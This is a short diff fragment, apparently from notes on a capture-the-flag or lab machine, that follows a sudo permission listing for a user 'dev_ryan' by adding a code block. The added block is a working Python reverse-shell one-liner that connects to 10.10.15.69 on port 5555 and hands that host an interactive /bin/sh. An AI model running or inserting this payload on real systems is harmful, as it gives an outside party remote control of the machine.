@@ -251,3 +251,8 @@ User dev_ryan may run the following commands on devarea:
 
 
 ```
+
+
+```
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.15.69",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+```
